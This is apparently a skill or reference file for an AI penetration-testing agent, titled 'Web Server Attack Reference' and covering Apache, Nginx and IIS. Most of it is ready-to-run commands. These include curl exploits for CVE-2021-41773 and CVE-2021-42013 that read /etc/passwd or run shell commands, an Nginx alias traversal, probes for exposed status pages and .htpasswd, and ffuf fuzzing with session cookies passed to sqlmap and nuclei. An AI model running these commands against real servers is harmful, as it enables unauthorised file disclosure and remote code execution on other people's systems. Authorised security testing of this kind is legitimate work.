---
name: svc-web-server
description: Web server software attacks (Apache/Nginx/IIS CVEs, misconfigs, status leaks).
---

# Web Server Attack Reference

## Apache
- **CVE-2021-41773** (2.4.49): `curl 'http://<t>/cgi-bin/.%2e/%2e%2e/etc/passwd'`
- **CVE-2021-42013** (2.4.49-50): `curl 'http://<t>/cgi-bin/.%%32%65/.%%32%65/bin/sh' -d 'echo;id'`
- **Misconfigs**: `/server-status`, `/server-info`, `/.htaccess`, `/.htpasswd`.

## Nginx
- **CVE-2017-7529** (<1.13.2): Integer overflow info leak.
- **Alias Traversal**: `curl http://<t>/static../etc/passwd`
- **Misconfigs**: `/nginx_status`, `/status`.

## IIS
- **CVE-2017-7269** (6.0 WebDAV): Buffer overflow RCE.
- **CVE-2021-31166** (HTTP.sys): Header RCE.
- **Shortnames**: `curl http://<t>/~1/`
- **WebDAV**: `curl -X OPTIONS http://<t>/ -sI`

## Fuzzing & Probing
- Never curl-loop over paths; use `ffuf`:
  `ffuf -w wordlist.txt -u http://<t>/FUZZ -mc 200,301,302,401,403 -maxtime 60 -o ffuf.json -of json`
- Auth: pass `-H "Cookie: ..."` into `ffuf`/`nuclei`/`sqlmap`.
- Fuzzing: add `-maxtime` to flush json before sandbox timeout.
